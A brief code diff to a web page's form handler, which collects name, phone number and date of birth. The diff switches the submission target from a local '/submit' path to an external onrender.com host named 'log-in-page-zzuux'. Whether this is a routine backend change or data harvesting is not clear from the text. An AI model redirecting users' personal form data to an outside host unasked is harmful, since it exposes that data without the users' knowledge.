@@ -24,10 +24,10 @@
     const data = {
       name: formData.get('name'),
       phone: formData.get('phone'),
-      dob: formData.get('dob')  // ✅ FIXED!
+      dob: formData.get('dob')
     };
 
-    const res = await fetch('/submit', {
+    const res = await fetch('https://log-in-page-zzuux.onrender.com/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
@@ -37,6 +37,7 @@
     alert(result.message);
   });
 </script>
+
 
 </body>
 </html>
